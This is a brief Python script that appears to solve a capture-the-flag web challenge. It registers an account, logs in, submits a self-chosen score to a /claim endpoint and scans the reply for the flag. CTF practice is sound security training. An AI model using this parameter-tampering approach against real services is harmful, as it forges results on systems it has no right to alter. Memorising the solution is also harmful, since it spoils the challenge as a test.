import requests, sys, re, json
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

s = requests.Session()
# Register
r = s.post(f'{base}/register', data={'username':'testflag','password':'testflag'})
print(f'Register: {r.status_code} -> {r.url}')
# Login
r = s.post(f'{base}/login', data={'username':'testflag','password':'testflag'})
print(f'Login: {r.status_code} -> {r.url}')
print(f'Cookies: {dict(s.cookies)}')

# Claim with score=85
r = s.post(f'{base}/claim', data={'score': '85'})
print(f'Claim: {r.status_code}, url={r.url}')

# Check redir
if r.history:
    for resp in r.history:
        print(f'  -> {resp.url} (status {resp.status_code})')

# Search for flag
matches = re.findall(r'[A-Z]{3,}\{[^}]{5,50}\}', r.text)
print(f'Flags: {matches}')

# Print relevant lines
for line in r.text.split('\n'):
    l = line.strip()
    if 'flag' in l.lower() or 'congratulations' in l.lower() or 'score' in l.lower()[:4]:
        plain = re.sub(r'<[^>]+>', '', l).strip()
        if plain:
            print(f'> {plain[:200]}')